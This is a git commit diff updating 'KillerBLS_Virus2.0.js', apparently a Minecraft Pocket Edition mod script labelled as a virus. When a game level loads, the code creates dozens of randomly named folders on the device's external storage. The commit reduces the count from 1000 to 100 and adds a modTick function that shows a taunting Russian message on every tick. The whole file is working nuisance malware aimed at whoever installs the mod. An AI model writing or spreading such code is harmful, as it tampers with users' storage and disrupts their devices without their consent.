df6721f10b6eef9c8633652811b6d21761e52d43
KillerBLS <dm.mironov01@gmail.com>
2014-07-14 13:31:04 +0400

    Update KillerBLS_Virus2.0.js

--- KillerBLS_Virus2.0.js
+++ KillerBLS_Virus2.0.js
@@ -1,10 +1,14 @@
 //Original от ScaryEnderman
 function newLevel() {
 clientMessage("Теперь зайдите в свою sdcard'у :D");
-    for (var i = 0; i < 1000; i++) {
-        var r = Math.floor(Math.random() * 10000000);
+    for (var i = 0; i < 100; i++) {
+        var r = Math.floor(Math.random() * 10000);
         var d = new java.io.File(android.os.Environment.getExternalStorageDirectory().getAbsolutePath(), r);
         d.mkdirs();
     }
-    print("Вхахаха!!!");
+    print("Вхахаха!!! Зайди на sdcard'у");
+}
+
+function modTick() {
+    clientMessage("ВХАХАХАХА!!!! зайди на sdcard'у!!!");
 }
